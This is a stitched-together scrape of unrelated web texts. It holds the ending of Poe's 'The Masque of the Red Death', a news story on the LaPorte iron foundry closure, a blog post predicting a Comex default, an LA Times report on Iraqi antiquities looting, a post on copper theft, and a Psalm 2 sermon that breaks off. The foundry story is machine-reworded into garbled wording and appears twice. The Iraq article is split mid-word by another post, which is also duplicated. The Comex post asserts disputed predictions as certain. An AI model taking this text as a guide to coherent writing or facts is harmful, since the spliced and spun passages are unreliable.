Prince Prospero fell upon this spectral image (which, with a slow and solemn movement, as if more fully to sustain its role, stalked to and fro among the waltzers) he was seen to be convulsed, in the first moment with a strong shudder either of terror or distaste; but, in the next, his brow reddened with rage.</p>   <p>&#x201c;Who dares,&#x201d;&#x2014;he demanded hoarsely of the courtiers who stood near him&#x2014;&#x201d;who dares insult us with this blasphemous mockery? Seize him and unmask him&#x2014;that we may know whom we have to hang, at sunrise, from the battlements!&#x201d;</p>   <p>It was in the eastern or blue chamber in which stood the Prince Prospero as he uttered these words. They rang throughout the seven rooms loudly and clearly, for the prince was a bold and robust man, and the music had become hushed at the waving of his hand.</p>   <p>It was in the blue room where stood the prince, with a group of pale courtiers by his side. At first, as he spoke, there was a slight rushing movement of this group in the direction of the intruder, who at the moment was also near at hand, and now, with deliberate and stately step, made closer approach to the speaker. But from a certain nameless awe with which the mad assumptions of the mummer had inspired the whole party, there were found none who put forth hand to seize him; so that, unimpeded, he passed within a yard of the prince&#x2019;s person; and, while the vast assembly, as if with one impulse, shrank from the centres of the rooms to the walls, he made his way uninterruptedly, but with the same solemn and measured step which had distinguished him from the first, through the blue chamber to the purple&#x2014;through the purple to the green&#x2014;through the green to the orange&#x2014;through this again to the white&#x2014;and even thence to the violet, ere a decided movement had been made to arrest him. It was then, however, that the Prince Prospero, maddening with rage and the shame of his own momentary cowardice, rushed hurriedly through the six chambers, while none followed him on account of a deadly terror that had seized upon all. He bore aloft a drawn dagger, and had approached, in rapid impetuosity, to within three or four feet of the retreating figure, when the latter, having attained the extremity of the velvet apartment, turned suddenly and confronted his pursuer. There was a sharp cry&#x2014;and the dagger dropped gleaming upon the sable carpet, upon which, instantly afterwards, fell prostrate in death the Prince Prospero. Then, summoning the wild courage of despair, a throng of the revellers at once threw themselves into the black apartment, and, seizing the mummer, whose tall figure stood erect and motionless within the shadow of the ebony clock, gasped in unutterable horror at finding the grave cerements and corpse-like mask, which they handled with so violent a rudeness, untenanted by any tangible form.</p>   <p>And now was acknowledged the presence of the Red Death. He had come like a thief in the night. And one by one dropped the revellers in the blood-bedewed halls of their revel, and died each in the despairing posture of his fall. And the life of the ebony clock went out with that of the last of the gay. And the flames of the tripods expired. And Darkness and Decay and the Red Death held illimitable dominion over all.</p>  </div>

   <div>   <p>LAPORTE|An <b>iron</b> foundry that has actually been a major employer in LaPorte given that 1934 and made a few of the biggest metal castings in the United States is expected to close next month, putting even more than 120 workers out of work.</p>   <p>Allegheny Technologies Inc. is winding down its unprofitable ATI Casting Service plant in LaPorte after a not successful effort to offer the business. The foundry was originally supposed to be closed by completion of June, however had to fulfill outstanding orders and is now in the procedure of shutting down, stated Dan Greenfield, vice president of financier relations and corporate communications.</p>   <p>&#x201c;We&#x2019;re winding it down,&#x201d; he stated.</p>   <p>The Pittsburgh-based company laid off about half the labor force last month, and expects the closure will certainly be full by the end of August, United Steelworkers Resident 1191 president Donn Pendergrass stated. Displaced employees are eligible for task retraining programs. Numerous have actually already found brand-new positions at location companies such as Alcoa-Howmet, ArcelorMittal and the Michigan City Water Department.</p>   <p>ATI is still aiming to offer the 550,000-square-foot plant and its company elements, stated Greater LaPorte Economic Development Corp. Executive Director Bert Cook.</p>   <p>LaPorte&#x2019;s overall industrial market is strong, which bodes well for a <b>sale</b>, Cook said. The job rate is presently below 10 percent or 5 percent, relying on who you ask.</p>   <p>ATI Casting Service made high-quality of approximately 200,000 pounds from ductile and gray <b>iron</b> at the facility simply off of E. Lincolnway. Employees poured and molded big castings for printing presses, wind turbines, automobile stamping passes away, machine tool frames, industrial gas turbines and 16-cylinder diesel locomotive engine blocks.</p>   <p>A team of seven employees poured the first <b>iron</b> casting at exactly what was then Casting Service in 1934. Teledyne Industries purchased the foundry at 300 Philadelphia St. in 1967, and merged with Allegheny Ludlum three years later on, producing a company that was rebranded as Allegheny Technologies Inc. in 1999.</p>   <p>At its height, ATI Casting Service employed more 560 workers and produced 3 huge castings a day. The LaPorte facility created large metal castings taller than guys for the transmission of wind turbines and the engines that power trains. When it was thriving, the business used to give away a pickup to a fortunate worker each month, Pendergrass stated.</p>   <p>&#x201c;No person wins in a circumstance like this,&#x201d; he said. &#x201c;The business had actually been good to the employees. For a lot of them, it was their first task directly out of secondary school.&#x201d;.</p>   <p>The castings market has actually been having a hard time considering that the recession. Three plants have closed up until now this year, and a steel casting company submitted for bankruptcy, according to Foundry Blog site, which tracks the sector. ATI Casting Service saw need plummet and was attacked by several rounds of layoffs for many years.</p>   <p>Over the first 6 months of 2013, the LaPorte plant and an affiliated facility in Michigan brought in $10 million in earnings however posted a pre-tax loss of $9 million. ATI revealed in October it had closed the fabricated parts facility in Michigan and would attempt to offer the LaPorte factory.</p>   <p>&#x201c;These strategic actions are designed to position ATI for enhanced monetary performance in 2014 and beyond, streamline capital appropriation choices and enhance our focus on ATI&#x2019;s strategic companies,&#x201d; stated ATI chairman, president and CEO Rich Harshman.</p>   <p>However the business could not discover a purchaser willing to pay as much as it really wanted and chose earlier this year to simply wind down the operations.</p>   <p>&#x201c;In April 2014, we chose to close our LaPorte, Ind., <b>iron</b> castings facility, which was held for <b>sale</b> as part of ceased operations,&#x201d; Harshman said. &#x201c;After a comprehensive process, we concluded that we could not finish a <b>sale</b> transaction on commercially acceptable terms. We anticipate to record around $2 million in closure expenses, largely severance, in the 2nd quarter 2014 as an outcome of this decision.&#x201d;.</p>   <p>A total of 123 employees&#x2013; moldmakers, electricians, crane operators, the president, everyone&#x2013; will lose their tasks as an outcome of the permanent closure.</p>   <p>&#x201c;Some are having a tough time adjusting, considering that it&#x2019;s the only place they have actually ever worked,&#x201d; Pendergrass said. &#x201c;The unfortunate part is that influences households and the whole neighborhood. The steelworkers are trying to make their transition as smooth as possible.&#x201d;. </p>  </div>

   <div>   <p><strong>Orwell would blush over what&#x2019;s being done to our system if he were alive.</strong> &#xa0;&#x2013; Investment Research Dynamics..<strong>.I think a lot of precious metals futures contracts are going&#xa0;to&#xa0;undergo a disappearing act</strong>. &#xa0;&#x2013; John Titus of </p>   <p>The CME curiously reported that it received notice from the Federal Reserve that it is authorized to open an account at the Fed which would &#x201c;allow it to better safeguard cash deposited by its traders&#x201d; &#xa0;.</p>   <p>This is event is notable for several reasons. &#xa0;First and foremost is the fact that the CME was designated as a &#x201c;systematically important&#x201d; financial institution as part of the Dodd-Frank &#x201c;hoodwink the taxpayer&#x201d; Act. &#xa0;If anyone can explain to me why a corrupted derivatives clearinghouse and trading exchange is &#x201c;systematically important,&#x201d; I will receive the explanation with an open mind.</p>   <p>To be quite frank, no bank is systematically important, especially the big banks which are continuously wrist-slapped for committing criminal acts of fraud and screwing the public. As has been demonstrated, the &#x201c;systematically important&#x201d; designation is nothing more that a guarantee to the banks that Taxpayer money will be tapped to ensure bonus payments may remain uninterrupted in the event of a bank collapse.</p>   <p>Another puzzling aspect of the CME&#x2019;s decision to open a custodial account at the Fed is in the CME&#x2019;s statement that the Fed account will allow it to better &#x201c;safeguard&#x201d; cash deposited by its traders. &#xa0;Note that the account is limited to &#x201c;clearing members proprietary margin&#x201d; accounts. &#xa0; This would be the cash put up by Comex clearing members &#x2013; like the Too Big To Fail Banks (JP Morgan, Goldman, Citi, HSBC etc) &#x2013; against margin requirements.</p>   <p>Why is a Fed custodial account any better than a custodial account held by a big bank? &#xa0; <strong><em>Is this an unintended signal from the Fed that the big banks are no longer safe as custodians of cash deposits?&#xa0;</em></strong></p>   <p>To me this reeks of the CME enabling a mechanism that &#x201c;ring-fences&#x201d; any cash equity put up by clearing members for the purposes of protecting that cash against an event of&#xa0;default or bankruptcy. &#xa0;It would give the CME control over this cash. &#xa0; This is what occurred when Jon Corzine incinerated MF Global and JP Morgan was able to grab any and all available collateral for its own benefit.</p>   <p>Again, this suggests to me that CME is concerned about the risk embedded in the proprietary futures and derivatives positions of its clearing members. &#xa0;I would suggest that the CME is specifically nervous about the precious metals futures positions held by JP Morgan, HSBC and Scotia.</p>   <p>With the absurd imbalance between Comex gold/silver contracts and the amount of underlying physical gold/silver bars held at the Comex for delivery, it&#x2019;s not a question of &#x201c;if&#x201d; the Comex eventually defaults but a question of &#x201c;when.&#x201d; &#xa0; Anyone who disagrees with this assertion is either in a state of pathetic denial or appalling&#xa0;ignorance.</p>   <p>Don&#x2019;t forget that Comex contracts have a &#x201c;force majeur&#x201d; provision which enables the cash settlement of these contracts. &#xa0;Given that the outrageously large short positions in gold and silver futures contracts are primarily held by the big banks, who also happen to be clearing members, the move by the CME to ring-fence cash collateral at the Fed which is deposited by the big banks who are short gold/silver futures expressly suggests that an event of default may be closer than any of us realizes.</p>   <div>    <div>     <h3>Share this:</h3>     <div>      <ul>       <li>        <div>         <span><span><span><span><span><span>0</span></span></span></span></span></span>        </div></li>      </ul>     </div>    </div>   </div>   <div>    <h3><em>Related</em></h3>    <div>     <p><span>October 11, 2013</span><span>With 32 comments</span></p>     <p><span>September 9, 2015</span><span>In &quot;Financial Markets&quot;</span></p>     <p><span>November 15, 2013</span><span>With 34 comments</span></p>    </div>   </div>  </div>

Lincolnway. Employees poured and molded big castings for printing presses, wind turbines, automobile stamping passes away, machine tool frames, industrial gas turbines and 16-cylinder diesel locomotive engine blocks.</p>   <p>A team of seven employees poured the first iron casting at exactly what was then Casting Service in 1934. Teledyne Industries purchased the foundry at 300 Philadelphia St. in 1967, and merged with Allegheny Ludlum three years later on, producing a company that was rebranded as Allegheny Technologies Inc. in 1999.</p>   <p>At its height, ATI Casting Service employed more 560 workers and produced 3 huge castings a day. The LaPorte facility created large metal castings taller than guys for the transmission of wind turbines and the engines that power trains. When it was thriving, the business used to give away a pickup to a fortunate worker each month, Pendergrass stated.</p>   <p>&#x201c;No person wins in a circumstance like this,&#x201d; he said. &#x201c;The business had actually been good to the employees. For a lot of them, it was their first task directly out of secondary school.&#x201d;.</p>   <p>The castings market has actually been having a hard time considering that the recession. Three plants have closed up until now this year, and a steel casting company submitted for bankruptcy, according to Foundry Blog site, which tracks the sector. ATI Casting Service saw need plummet and was attacked by several rounds of layoffs for many years.</p>   <p>Over the first 6 months of 2013, the LaPorte plant and an affiliated facility in Michigan brought in $10 million in earnings however posted a pre-tax loss of $9 million. ATI revealed in October it had closed the fabricated parts facility in Michigan and would attempt to offer the LaPorte factory.</p>   <p>&#x201c;These strategic actions are designed to position ATI for enhanced monetary performance in 2014 and beyond, streamline capital appropriation choices and enhance our focus on ATI&#x2019;s strategic companies,&#x201d; stated ATI chairman, president and CEO Rich Harshman.</p>   <p>However the business could not discover a purchaser willing to pay as much as it really wanted and chose earlier this year to simply wind down the operations.</p>   <p>&#x201c;In April 2014, we chose to close our LaPorte, Ind., iron castings facility, which was held for sale as part of ceased operations,&#x201d; Harshman said. &#x201c;After a comprehensive process, we concluded that we could not finish a sale transaction on commercially acceptable terms. We anticipate to record around $2 million in closure expenses, largely severance, in the 2nd quarter 2014 as an outcome of this decision.&#x201d;.</p>   <p>A total of 123 employees&#x2013; moldmakers, electricians, crane operators, the president, everyone&#x2013; will lose their tasks as an outcome of the permanent closure.</p>   <p>&#x201c;Some are having a tough time adjusting, considering that it&#x2019;s the only place they have actually ever worked,&#x201d; Pendergrass said. &#x201c;The unfortunate part is that influences households and the whole neighborhood. The steelworkers are trying to make their transition as smooth as possible.&#x201d;. </p>  </div>  
   <div>   <p>Recovered: Antiquities from recent excavations in southern Iraq</p>   <p>Ilegal diggers are chipping away at Iraq&#x2019;s heritage at thousands of largely unguarded sites. The artifacts may never be returned. By Alexandra Zavis Los Angeles Times Staff Writer</p>   <p>January 22, 2008</p>   <p>BAGHDAD &#x2014; He works as a blacksmith in one of Baghdad&#x2019;s swarming Shiite slums. But at least once a month, Abu Saif tucks a pistol into his belt, hops into a minibus taxi and speeds south.</p>   <p>His goal: to unearth ancient treasures from thousands of archaeological sites scattered across southern Iraq.</p>   <p>Images of Baghdad&#x2019;s ransacked National Museum, custodian of a collection dating back to the beginning of civilization, provoked an international outcry in the early days of the war in 2003.</p>   <p>The ancient statues, intricately carved stone panels, delicate earthenware and glittering gold are now protected by locked <b>gates</b> and heavily armed guards. But U.S. and Iraqi experts say a tragedy on an even greater scale continues to unfold at more than 12,000 largely unguarded sites where illegal diggers like Abu Saif are chipping away at Iraq&#x2019;s heritage.</p>   <p>&#x201c;It may well be that more stuff has come out of the sites than was ever in the Iraqi museum,&#x201d; said Elizabeth Stone, an archaeology professor at the State University of New York at Stony Brook.</p>   <p>Iraqi officials say the U.S. government has supported their efforts to retrieve looted antiquities from the Sumerian, Babylonian, Assyrian, Islamic and other civilizations, but they do not hide their bitterness that more was not done to secure them in the first place.</p>   <p>&#x201c;Iraq floats over two seas; one is oil and the other is antiquities,&#x201d; said Abdul Zahra Talaqani, media director for Iraq&#x2019;s Ministry of State for Tourism and Archaeology. &#x201c;The American forces, when they entered, they protected all the oil wells and the Ministry of Oil . . . but the American forces paid no attention to Iraq&#x2019;s heritage.&#x201d;</p>   <p>The thefts were already taking place before the U.S.-led invasion in March 2003, but U.S. and Iraqi experts say they surged in the ensuing chaos.</p>   <p>Abu Saif, a man in his mid-30s with dark eyes, calloused hands and a long, black coat, was 14 when relatives introduced him to the hunt for buried treasure. Asked why he does it, he grins.</p>   <p>&#x201c;For the thrill of it,&#x201d; he said.</p>   <p>In the beginning, he was a lookout for others. Now, he has his own tightknit group of four or five diggers. He collects tips from farmers about possible archaeological sites and researches them in his small collection of dogeared books before traveling inconspicuously to meet his team and excavate. They work quickly, finishing a job in two to three days.</p>   <p>If they are successful, which they usually are, he shares the find with his diggers and the property owner. He considers what he does a hobby and says he sells only what he needs to cover costs. But he is vague about who the buyers are.</p>   <p>Talaqani says criminal gangs buy artifacts from men like Abu Saif and smuggle them out of the country. U.S. officials also suspect that Sunni and Shiite paramilitary groups may be taking a cut.</p>   <p>Abu Saif, who asked to be identified by a traditional nickname, admits that he once paid members of a Shiite militia to protect a site where he was digging. But a few hours later, another group of gunmen turned up and demanded more money. Now, he says, he refuses to deal with the militias.</p>   <p>He avoids the more famous sites such as the ancient cities of Isin, Shurnpak and Umma because &#x201c;there are eyes upon them.&#x201d; But he says there are plenty of out-of-the-way places near Kut and Nasiriya that yield small treasures. The artifacts include coins, jewelry and fragile clay tablets etched in wedge-like cuneiform script, recording myths, decrees, business transactions and other details of Mesopotamian life.</p>   <p>At his two-story cinder-block home, he pulls out old jewelry boxes and rummages through spools of thread to find ancient gems of agate and carnelian. His most treasured possession is a thumb-sized cylinder with a man&#x2019;s face carved into one side and a woman&#x2019;s face into the other. An appraiser told him it was from Babylonian times and was worth as much as $4,000. Asked whether he planned to sell it, he looked horrified and said, &#x201c;No, these are my children!&#x201d;</p>   <p>Stone has been tracing the thefts at 2,000 sites in the south using DigitalGlobe satellite imagery. She estimates that looters have torn up about 167 million square feet.</p>   <p>&#x201c;It&#x2019;s a huge amount of area,&#x201d; she said. &#x201c;Archaeologists have dug just a tiny fraction of that.&#x201d;</p>   <p>She said small-scale digging began in the 1990s, when government neglect and a United Nations embargo pushed a large number of farmers into penury in the largely Shiite south, home to many of Iraq&#x2019;s richest archaeological sites. But in the weeks before the 2003 invasion, the images show holes spreading rapidly across many of the smaller and medium-sized sites.</p>   <p>Most of these places weren&#x2019;t touched again until the last months of 2003. But at the sites of some of the more important cities, there was a huge push that summer, which Stone said appeared far more systematic and organized than previous digging. Umma, a major Sumerian city that was partially excavated before the war, was turned into a moonscape. Afterward, the pace slowed considerably, though she has seen little imagery from 2007.</p>   <p>Taking advantage of an ebb in violence, the Iraqi government last year resumed its own excavations for the first time since the war started. It now has 11 teams on a salvage mission in southern Iraq. But almost everywhere they have been, illegal diggers have been before them, leaving devastation in their wake.</p>   <p>&#x201c;What it takes us one month to dig, they do in one day, so you can imagine what damage they do,&#x201d; said Iyad Mohammed Hussein, whose team recently uncovered an oval-shaped temple dating to the Babylonian empire in Maysan province.</p>   <p>It isn&#x2019;t only artifacts that they are after. In Basra, residents dug up the foundations of old Islamic buildings and used the bricks to build their homes, said Mohammed Khaiyoon Nasir, who oversees excavations in the southern oil hub.</p>   <p>&#x201c;I feel pain in my heart,&#x201d; said the diminutive man in a dark suit and spectacles. &#x201c;This ancient civilization has been broken to pieces.&#x201d;</p>   <p>The loss is incalculable. It was here, in the land between the Tigris and Euphrates rivers, that human beings began to farm, etch words into clay, codify laws and build cities. Now, the records of that evolution are slipping away.</p>   <p>Stolen artifacts occasionally turn up on the market or in private collections. Last month, a 4,000-year-old inscribed clay tablet, which authorities suspect was smuggled from Iraq, was pulled from EBay&#x2019;s Swiss website minutes before the close of bidding. In 2006, Iraqi authorities were informed that a limestone head of a 2nd century BC king had been seized from the home of a Lebanese interior decorator and transferred to a museum for safekeeping.</p>   <p>But experts suspect that most of the stolen objects are hidden in warehouses around the world because they are too hot to sell.</p>   <p>The museum has recovered nearly 4,000 of the 15,000 pieces lost in looting triggered by the U.S. troops&#x2019; arrival, some of the thefts spontaneous and some seemingly carefully planned. Initial reports that 170,000 artifacts had been stolen proved to be exaggerated.</p>   <p>Many were brought back to the museum by Iraqis taking advantage of a policy of accepting returns with no questions asked. They include such prized possessions as a 5,000-year-old limestone vase from the Sumerian city of Warka, which three men produced from the trunk of a car in the summer of 2003.</p>   <p>Most are now boxed up and locked behind <b>i   <div>   <p>On Monday the New York Times of a Detroit metal scrapper going about his business, scrounging for metal and seeking places to sell it. Business isn&#x2019;t what it used to be, the Times tells us, mostly thanks to a spate of law enforcement measures that make it harder to fence scrap &#x2013; especially copper wire and plumbing &#x2013; from abandoned buildings. The proof is in the data: Detroit issued 222 warrants for scrap metal theft in 2012. This year, it&#x2019;s issued &#x201c;around 25.&#x201d;</p>   <p>It&#x2019;s not just Detroit. The UK&#x2019;s Local Government Association points to the 2013 passage of a &#xa0;as the that there were &#x201c;only&#x201d; 40,680 metal thefts in England and Wales in 2014, compared to 59,788 in 2013.&#xa0;&#xa0;Likewise, last May the US&#x2019;s National Insurance Crime Bureau [NCIB] that insured metal theft had declined 26% between 2011 and 2013, from 14,676 cases to 10,807 &#x2013; and it pointed specifically to legislation and law enforcement as the restraining factor.</p>   <p>No doubt, law enforcement has played an important role in restricting the easy options for metal thieves to fence scrap. But I&#x2019;d argue the more important reason metal theft &#x2013; especially copper theft &#x2013; has declined over the last three years is embodied in the chart I&#x2019;ve pasted below (click to enlarge). It shows the price of copper, dating back to its five year highs in early 2011 &#x2013; and its precipitous, nearly 50% decline ever since (mostly thanks to falling Chinese demand). The price of scrap copper, including wires pulled from your home&#x2019;s walls, is based on these prices:</p>   <p>At those prices, it&#x2019;s probably still worth scrapping if you&#x2019;re desperate &#x2013; like the fellow profiled by the NYT. But for criminals who might have other options (including other options for selling it), the difference between $4/lb copper and $2.50/lb copper is probably big enough to make you think twice about breaking into an abandoned house to pull out its wiring.</p>   <p>That&#x2019;s not to denigrate the work of law enforcement. They&#x2019;ve played a crucial role in making the cost/benefit less attractive to thieves with access to $2.50/lb copper. But I <em>do</em> question just how much of a role those efforts played at a time when metal prices (not just copper) are in the midst of a three year bear market. What happens when (not if) the price of copper gets back to $4? Will those measures be effective? My guess is that they will be, but only marginally. In other words: when copper starts moving up again, so will the theft, and law enforcement will be far less ready than it thinks.</p>   <p>One other factor worth touching on &#x2013; and which gets brief mention in the NYT piece: there&#x2019;s simply less scrap metal out there (something that I&#x2019;ve heard in conversation with the legitimate scrap metal dealers with whom I speak regularly). This makes sense, of course. At some point, Detroit&#x2019;s scrappers will have stripped out as many houses and businesses as is physically possible. Nonetheless, one thing you learn after a lifetime around scrap metal (mine, as partly documented in ) &#x2014; where there&#x2019;s a market, there&#x2019;s scrap. And right now, the market .</p>   <p>[P.S.

ron</b> <b>gates</b> in the museum&#x2019;s basement, waiting for a time when it will be safe enough to open to the public.</p>   <p>Recovering the artifacts looted from archaeological sites has proved far more difficult.</p>   <p>The government offers rewards ranging from about 10,000 Iraqi dinars ($8) to 5 million Iraqi dinars ($4,000), depending on the value of the items returned. But the U.N. Educational, Scientific and Cultural Organization, or UNESCO, worries that the program could be encouraging more illegal digging, said Mohammed Djelib, who heads the organization&#x2019;s Iraq office, located in neighboring Jordan.</p>   <p>Once the artifacts leave Iraq, officials say they are virtually powerless to retrieve them. Unlike museum pieces, items dug up illegally do not appear on an inventory and have no serial numbers etched into them. Without proof of the country of origin, the only way Iraq can get them back is to buy them, said Amira Eidan, the museum director and acting chairwoman of the State Board of Antiquities and Heritage.</p>   <p>A 3 1/4 -inch limestone lion believed to be from Mesopotamia recently sold at Sotheby&#x2019;s in New York for a record $57 million.</p>   <p>&#x201c;Imagine how much money I would need to bring all these antiquities back to Iraq,&#x201d; Eidan said, wide-eyed, at her museum office.</p>   <p>The Iraqi government has formed a specialized guard force to secure archaeological sites. But at just 1,400 men, it is no match for the armed gangs responsible for much of the looting. UNESCO provided training and donated 37 vehicles to the project, Djelib said. But the guards said the well-appointed pickup trucks would make them targets, and refused to use them.</p>   <p>Donny George, the heritage board&#x2019;s charismatic former chairman, accused his bosses at the archaeology ministry of not doing enough to secure the sites. He alleged in media reports that the ministry had come under the influence of Shiite Islamists with no interest in safeguarding pre-Islamic sites, charges denied by Talaqani.</p>   <p>Efforts to protect Iraq&#x2019;s vanishing heritage foundered after George resigned in August 2006 and fled the country, during some of the war&#x2019;s worst bloodshed. But they have picked up again since September, when a new acting minister, Mohammed Abbas Oreibi, was appointed from former interim Prime Minister Iyad Allawi&#x2019;s secular political bloc. The post had been vacant since April, when followers of radical Shiite cleric Muqtada Sadr quit the Cabinet.</p>   <p>In November, UNESCO held a conference of experts in Iraqi antiquities at which countries were urged to set up &#x201c;safe havens&#x201d; where recovered items could be stored until they could be returned to Iraq. Experts hope the initiative will encourage dealers to turn over any looted antiquities they are hiding, rather than destroy them.</p>   <p>But Djelib said it would take a more serious effort by Iraq&#x2019;s own government, its neighbors and the world at large to safeguard what he described as the heritage of humanity.</p>   <p>&#x201c;It is difficult to talk about antiquities when people are dying, or they don&#x2019;t have water and electricity,&#x201d; he said. &#x201c;But you can&#x2019;t wait for the situation to improve before deciding what to do, because by then it will be too late.&#x201d;</p>   <p>Times staff writers Usama Redha and Saif Rasheed contributed to this report.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>  </div>

   <div>   <p>On Monday the New York Times of a Detroit metal scrapper going about his business, scrounging for metal and seeking places to sell it. Business isn&#x2019;t what it used to be, the Times tells us, mostly thanks to a spate of law enforcement measures that make it harder to fence scrap &#x2013; especially copper wire and plumbing &#x2013; from abandoned buildings. The proof is in the data: Detroit issued 222 warrants for scrap metal theft in 2012. This year, it&#x2019;s issued &#x201c;around 25.&#x201d;</p>   <p>It&#x2019;s not just Detroit. The UK&#x2019;s Local Government Association points to the 2013 passage of a &#xa0;as the that there were &#x201c;only&#x201d; 40,680 metal thefts in England and Wales in 2014, compared to 59,788 in 2013.&#xa0;&#xa0;Likewise, last May the US&#x2019;s National Insurance Crime Bureau [NCIB] that insured metal theft had declined 26% between 2011 and 2013, from 14,676 cases to 10,807 &#x2013; and it pointed specifically to legislation and law enforcement as the restraining factor.</p>   <p>No doubt, law enforcement has played an important role in restricting the easy options for metal thieves to fence scrap. But I&#x2019;d argue the more important reason metal theft &#x2013; especially copper theft &#x2013; has declined over the last three years is embodied in the chart I&#x2019;ve pasted below (click to enlarge). It shows the price of copper, dating back to its five year highs in early 2011 &#x2013; and its precipitous, nearly 50% decline ever since (mostly thanks to falling Chinese demand). The price of scrap copper, including wires pulled from your home&#x2019;s walls, is based on these prices:</p>   <p>At those prices, it&#x2019;s probably still worth scrapping if you&#x2019;re desperate &#x2013; like the fellow profiled by the NYT. But for criminals who might have other options (including other options for selling it), the difference between $4/lb copper and $2.50/lb copper is probably big enough to make you think twice about breaking into an abandoned house to pull out its wiring.</p>   <p>That&#x2019;s not to denigrate the work of law enforcement. They&#x2019;ve played a crucial role in making the cost/benefit less attractive to thieves with access to $2.50/lb copper. But I <em>do</em> question just how much of a role those efforts played at a time when metal prices (not just copper) are in the midst of a three year bear market. What happens when (not if) the price of copper gets back to $4? Will those measures be effective? My guess is that they will be, but only marginally. In other words: when copper starts moving up again, so will the theft, and law enforcement will be far less ready than it thinks.</p>   <p>One other factor worth touching on &#x2013; and which gets brief mention in the NYT piece: there&#x2019;s simply less scrap metal out there (something that I&#x2019;ve heard in conversation with the legitimate scrap metal dealers with whom I speak regularly). This makes sense, of course. At some point, Detroit&#x2019;s scrappers will have stripped out as many houses and businesses as is physically possible. Nonetheless, one thing you learn after a lifetime around scrap metal (mine, as partly documented in ) &#x2014; where there&#x2019;s a market, there&#x2019;s scrap. And right now, the market .</p>   <p>[P.S.

   <div>   <p>Podcast: | (27.7MB) </p>   <p>Subscribe: | | </p>   <p>Jesus Christ is God&#x2019;s anointed King over the creation. Rejecting this reality will not help your case when He returns to judge His enemies. However, the Lord of Heaven is mercifully delaying judgment and offers an opportunity to repent. Rather than foolishly resisting Him, you can humbly recognize His sovereignty and submit to His lordship. Happy are those who turn to Him before it is too late.</p>   <p> You see, there is no place for rebels in the kingdom of God because it is a kingdom of righteousness. You cannot have all the blessings of God while remaining in opposition to Him. Only repentant sinners can receive the gift of eternal life. </p>   <p> It is for this very reason that Jesus Christ came to die on the cross, since it is there that God dealt with the sins of the repentant. Christ stood condemned in our place and suffered the wrath of God for our iniquity. Then God raised His Son from death to verify Him as Savior and establish Him as Lord. Now God can pardon and bring into His kingdom any and all who will confess their sins and humbly trust His Son. The only other option is to suffer eternal death in hell as a defiant sinner.</p>   <p> This is the emphasis as we continue our study of the second psalm, which deals with God&#x2019;s sovereign kingdom. As the earthly representative of heaven&#x2019;s throne, King David of Israel was very familiar with human rebellion. The resistance of sinners in the nations around him was a continual reminder. He also understood that God would ultimately send His Son into the world as the anointed King to fulfill all righteousness. In fact, God had promised David that the Christ would be one of his descendants (cf. 2 Sam. 7; Ps. 132:11).</p>   <p> For this reason, the Holy Spirit gave David insight into the final days of the rebellion when Christ would utterly destroy His enemies and establish the throne on earth. Psalm 2:1-6 explained that, although the nations will take a final stand to resist heaven (vv. 1-3), God&#x2019;s kingdom is nonetheless sovereign. And Jesus Christ, the Great King, will most certainly reign in Jerusalem. </p>   <p> In part two of our study, which comes from Psalm 2:7-12, we will see that this is not mere conjecture on David&#x2019;s part. Rather, it is a heavenly mandate &#x2014; a divine decree &#x2014; that Christ should rule the nations in power and glory. And God&#x2019;s call to the people of the world is to repent before the time of judgment comes.</p>   <p> <b>God&#x2019;s Sovereign Kingdom</b> &#x2013; Part II <i>Christ&#x2019;s Reign</i> (vv. 7-9) Revelation 19:6 proclaims: &#x201c;&#x2026;the Lord God Omnipotent reigns!&#x201d; That declaration is made just as Christ begins His procession from heaven to earth at the end of the Great Tribulation. And despite Satan&#x2019;s opposition through Antichrist and the nations of the world, the rebellion will be entirely crushed. The Lord Jesus will Himself deliver the final blow at the Battle of Armageddon (Rev. 14:14-20; 19:17-21) and establish His throne on the holy hill of Zion (v. 6; cf. Ps. 132:13-18).</p>   <p> The divine decree is recounted for us here in verses seven through nine by the Christ Himself. Evidently, upon God the Son&#x2019;s incarnation, God the Father made this declaration that His Anointed (v. 2) would reign forever with all authority (cf. Matt. 28:18). The Father will mock His enemies in righteous indignation for their foolish resistance (vv. 4-6). It appears as though God the Son &#x201c;will declare the decree&#x201d; when He arrives in Jerusalem at His Second Coming. That is, He will recite at that time the mandate which &#x201c;the LORD&#x201d; His Father earlier gave (&#x201c;said&#x201d;) to Him (v. 7; cf. 1 Cor. 15:24-28).</p>   <p> The Father&#x2019;s declaration is that the Christ would be His &#x201c;Son.&#x201d; That is, heaven&#x2019;s anointed King would be the incarnate second Person of the Trinity. He was &#x201c;begotten&#x201d; in that He was &#x201c;brought forth&#x201d; into humanity (Heb. 1:5) to die as Savior and then &#x201c;brought forth&#x201d; into glory by resurrection to God&#x2019;s right hand (Acts 13:33-34). In the fullness of time (Gal. 4:4), He came to fulfill the role of Savior and Lord (Phil. 2:5-11). </p>   <p> The messianic title, Son of Man, reflects His humiliation and His exaltation (cf. Dan. 7:13-14; Rev. 1:13; 14:14). He is completely identified with the human race, yet without sin (Heb. 4:15). As the sinless Son of God, He is qualified to receive the everlasting throne of His heavenly Father. He is also qualified to complete the royal line of David as the ultimate King &#x2014; David&#x2019;s greater descendant.</p>   <p> The heavenly agenda, determined in eternity past, is for the Son to glorify the Father by bringing His sovereign kingdom to the rebellious world of men and to redeem the saints for the kingdom (Col. 1:9-18). The kingdom is Christ&#x2019;s for the taking because the Father desires to give it to Him. Therefore, He says to His Son:</p>   <p> <i>Ask of Me, and I will give You The nations for Your inheritance, And the ends of the earth for Your possession</i> (v. 8a).</p>   <p> In other words, He will be given the supreme place over the human race and dominion over the earth as it was intended for mankind (Gen. 1:28). His reign will be righteous, and the earth will be restored to Eden-like glory in the Millennial Kingdom (cf. Pss. 72; 96; 110; Is. 11). Then He will rule the new heavens and the new earth where only righteousness will exist (2 Pet. 3:13).</p>   <p> When Satan tried to offer Jesus the kingdoms of this world in return for worship, our Lord refused. For He knew they were His without question. The Father had already declared this decree to Him, and He would worship and serve the Father in complete obedience (Matt. 4:8-10; Heb. 5:8). He humbled Himself even to endure the cross, since He knew the glory that awaited Him by the Father&#x2019;s right hand (Heb. 12:2).</p>   <p> Christ will not only inherit the human race and possess the ends of the earth, but He will reign with absolute, unchallenged power. Verse nine initially explains that He &#x201c;shall break [i.e. rule] them with a rod of iron.&#x201d; The &#x201c;rod&#x201d; refers to both a shepherd&#x2019;s staff and a king&#x2019;s scepter. Both are probably in view here to describe Christ as the Great Shepherd and King of kings (David was a shepherd/king). It is a &#x201c;rod of iron,&#x201d; meaning that He will rule with an unwavering righteousness 